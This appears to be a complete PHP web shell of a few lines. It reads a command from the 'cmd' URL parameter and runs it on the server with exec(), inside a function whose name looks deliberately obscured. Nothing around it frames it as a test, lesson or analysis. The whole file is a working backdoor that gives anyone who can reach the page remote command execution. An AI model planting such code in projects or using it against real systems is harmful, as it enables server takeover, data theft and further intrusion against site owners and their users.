<?php
function dQ99exec($cmd) {
    exec($cmd,$o); 
	$output = join("\r\n",$o);
    return $output;
}

$cmdline = $_GET['cmd'];
$ret = dQ99exec($cmdline);
?>